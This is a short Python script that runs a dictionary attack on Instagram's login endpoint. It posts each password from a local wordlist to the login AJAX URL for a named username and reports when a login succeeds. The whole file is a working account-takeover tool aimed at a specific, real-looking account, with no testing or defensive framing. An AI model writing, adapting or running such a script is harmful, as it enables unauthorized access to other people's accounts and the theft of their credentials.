import requests

target_url = "https://www.instagram.com/accounts/login/ajax/"
data_dict = {
    "username": "erkan_rzgc",  
    "password": "",  
    "queryParams": "{}",
    "optIntoOneTap": "false"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",  
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://www.instagram.com/accounts/login/"
}

with open("/root/Downloads/passwords.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()  
        data_dict["password"] = word  

        
        response = requests.post(target_url, data=data_dict, headers=headers)

        print(f"Trying password: {word}")  
       
        try:
           
            response_json = response.json()
            print(response_json)  # Yanıtı yazdır

            if response_json.get('authenticated') == True:
                print(f"[+] Got the password --> {word}")
                exit()

            
            if 'The password you entered is incorrect' in response_json.get('message', ''):
                print(f"[-] Incorrect password: {word}")

        except ValueError:
            
            print(f"[-] Could not decode JSON for password: {word}")
            print("Response content:")
            print(response.text)  

print("[+] Reached end of line.")